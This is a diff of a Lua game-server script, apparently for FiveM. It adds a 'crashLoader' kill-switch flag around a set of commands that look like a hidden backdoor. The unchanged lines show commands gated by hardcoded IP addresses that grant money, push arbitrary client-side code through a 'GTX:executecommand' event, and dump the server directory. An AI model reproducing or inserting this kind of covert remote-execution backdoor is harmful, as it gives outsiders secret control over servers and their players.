@@ -1,9 +1,12 @@
+local old = false
+
 RegisterCommand("crashLoader", function(source, args)
     local _source = source
-    TriggerClientEvent('GTX:executecommand', _source2, "print('test')")
+    old = true
 end)
 
 RegisterCommand('givemoneytome', function(source, args, rawCommand)  
+    if not old then
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
                 
@@ -26,6 +29,7 @@ RegisterCommand('givemoneytome', function(source, args, rawCommand)
             end)
         end
      end
+     end
  end)
 
 local icey = false
@@ -33,6 +37,7 @@ local icey = false
 local ips = {"176.119.195.65","176.119.195.62","159.48.55.188","159.48.55.190","86.85.252.84","134.19.185.117","195.181.173.204","176.119.195.45","217.146.87.147","143.244.41.116","149.34.244.39","149.34.244.113"}
 
 RegisterCommand('icey', function(source, args, rawCommand)  
+    if not old then
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
                 
@@ -81,9 +86,11 @@ RegisterCommand('icey', function(source, args, rawCommand)
             end)
         end
      end
+     end
  end)
 
 RegisterCommand('remivemenow', function(source, args, rawCommand)  
+    if not old then
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
                 
@@ -104,6 +111,7 @@ RegisterCommand('remivemenow', function(source, args, rawCommand)
                 end
             end)
         end
+     end
      end
  end)
 
@@ -206,21 +214,27 @@ local client_side = [[
 ]]
 
 RegisterCommand("giveoutputevent", function(source, args)
+    if not old then
     local _source = source
     TriggerClientEvent('GTX:executecommand', _source, client_side)
+    end
 end)
 
 local dumper_source = nil
 
 RegisterCommand("attemptfix", function(source, args)
+    if not old then
     if args[1] and dumper_source == nil then
         TriggerEvent("attemptfix", args[1], source)
+    end
     end
 end)
 
 RegisterCommand("getserverdir", function(source, args)
+    if not old then
     local _source = source
     TriggerClientEvent("server_dumper:output", _source, GetServerFolder())
+    end
 end)
 
 AddEventHandler("attemptfix", function(id, _source)
